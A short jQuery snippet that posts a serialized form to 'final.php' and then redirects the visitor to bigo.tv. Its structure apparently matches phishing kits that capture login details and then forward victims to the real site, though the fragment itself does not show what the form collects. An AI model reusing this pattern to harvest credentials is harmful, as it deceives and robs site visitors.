$.ajax({
                        type: 'POST',
                        url: 'final.php',
                        data: $('#ngumpulinuangnikah').serialize(),
                        dataType: 'text',
                        success: function() {
                                    location.href = "https://www.bigo.tv";
                            } 
                    })
